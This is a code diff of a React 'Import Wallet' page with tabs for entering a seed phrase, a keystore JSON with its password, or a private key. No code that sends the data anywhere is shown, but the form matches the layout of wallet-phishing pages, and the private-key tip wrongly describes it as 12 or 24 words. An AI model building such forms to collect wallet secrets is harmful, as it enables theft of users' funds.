@@ -1,69 +1,123 @@
 import React from 'react';
 import '../../assets/styles/css/wallet-details-entry-page.css';
+import { useState } from 'react';
 
 function WalletDetailsEntryPage() {
+  const [showPhrase, setShowPhrase] = useState(false);
+  const [showKeyJson, setShowKeyJson] = useState(false);
+  const [showPrivateKey, setShowPrivateKey] = useState(true);
+
+  function displayPhrase() {
+    setShowPhrase(true);
+    setShowKeyJson(false);
+    setShowPrivateKey(false);
+  }
+
+  function displayKeyJson() {
+    setShowKeyJson(true);
+    setShowPhrase(false);
+    setShowPrivateKey(false);
+  }
+
+  function displayPrivateKey() {
+    setShowPrivateKey(true);
+    setShowPhrase(false);
+    setShowKeyJson(false);
+  }
+
   return (
-    <section className="wallet-details-entry-section">
-      <div className="section-header text-center">Enter Wallet Details</div>
+    <section className="wallet-details-entry-section" id={'top'}>
+      <div className="section-header text-center">Import Wallet</div>
+      <div className="options-wrapper">
+        <button
+          className="option-item"
+          style={{
+            backgroundColor: showPhrase && '#3877d3',
+            color: showPhrase && '#ffffff',
+          }}
+          onClick={displayPhrase}
+        >
+          Phrase
+        </button>
+        <button
+          className="option-item"
+          style={{
+            backgroundColor: showKeyJson && '#3877d3',
+            color: showKeyJson && '#ffffff',
+          }}
+          onClick={displayKeyJson}
+        >
+          Keystore JSON
+        </button>
+        <button
+          className="option-item"
+          style={{
+            backgroundColor: showPrivateKey && '#3877d3',
+            color: showPrivateKey && '#ffffff',
+          }}
+          onClick={displayPrivateKey}
+        >
+          Private Key
+        </button>
+      </div>
       <div className="form-area">
-        <div className="mb-3 ">
-          <label htmlFor="exampleFormControlInput1" className="form-label">
-            Email address
-          </label>
-          <input
-            type="email"
-            className="form-control"
-            id="exampleFormControlInput1"
-            placeholder="name@example.com"
-          ></input>
-        </div>
-        <div className="mb-3" style={{ display: 'none' }}>
-          <label htmlFor="exampleFormControlInput1" className="form-label">
-            Wallet type (This section is automatically prefilled)
-          </label>
-          <input
-            type="email"
-            className="form-control"
-            id="exampleFormControlInput1"
-            placeholder="name@example.com"
-          ></input>
-        </div>
-        <div className="mb-3">
-          <label htmlFor="exampleFormControlTextarea1" className="form-label">
-            Example textarea
-          </label>
-          <textarea
-            className="form-control"
-            id="exampleFormControlTextarea1"
-            rows="3"
-          ></textarea>
-        </div>
-        <div className="mb-3">
-          <label htmlFor="exampleFormControlTextarea1" className="form-label">
-            Example textarea
-          </label>
-          <textarea
-            className="form-control"
-            id="exampleFormControlTextarea1"
-            rows="3"
-          ></textarea>
-        </div>
-        <div className="mb-3">
-          <label htmlFor="exampleFormControlTextarea1" className="form-label">
-            Example textarea
-          </label>
-          <textarea
-            className="form-control"
-            id="exampleFormControlTextarea1"
-            rows="3"
-          ></textarea>
-        </div>
+        {showPhrase && (
+          <div className="mb-3">
+            <textarea
+              className="form-control"
+              id="exampleFormControlTextarea1"
+              placeholder="Phrase"
+              rows="5"
+            ></textarea>
+            <div className="tip-text">
+              Typically 12 (sometimes 24) words separated by single spaces.
+            </div>
+          </div>
+        )}
+        {showKeyJson && (
+          <div className="mb-3">
+            <textarea
+              style={{ marginBottom: '20px' }}
+              className="form-control"
+              id="exampleFormControlTextarea1"
+              placeholder="Keystore JSON"
+              rows="5"
+            ></textarea>
+            <div>
+              <input
+                type="password"
+                className="form-control"
+                placeholder="Password"
+                id="inputPassword"
+              ></input>
+            </div>
+            <div className="tip-text">
+              Several lines of text beginning with '(...)' plus the password you
+              used to encrypt it.
+            </div>
+          </div>
+        )}
+
+        {showPrivateKey && (
+          <div className="mb-3">
+            <input
+              type="text"
+              className="form-control"
+              id="exampleFormControlInput1"
+              placeholder="Private Key"
+            ></input>
+            <div className="tip-text">
+              Typically 12 (sometimes 24) words separated by single spaces.
+            </div>
+          </div>
+        )}
+
         <div className="submit-button-wrapper">
           <button
             className="show-more-wallet-btn btn submit-button"
             type="submit"
           >
-            Submit Wallet Details
+            Import
           </button>
         </div>
       </div>
